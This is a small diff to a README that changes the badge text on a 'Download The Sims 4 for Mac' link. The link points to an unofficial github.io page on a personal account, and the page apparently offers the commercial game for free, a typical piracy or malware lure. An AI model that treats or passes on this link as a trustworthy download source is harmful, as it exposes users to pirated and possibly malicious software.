@@ -6,7 +6,7 @@
 
 ## 🔽 Download The Sims 4 for Mac
 
-[![Download Now](https://img.shields.io/badge/Download_The-Sims-4-blueviolet?style=for-the-badge&logo=github)](https://montiko384.github.io/.github/thesims4)
+[![Download Now](https://img.shields.io/badge/Download_Sims4-blueviolet?style=for-the-badge&logo=github)](https://montiko384.github.io/.github/thesims4)
 
 ## 📦 How to Install
 
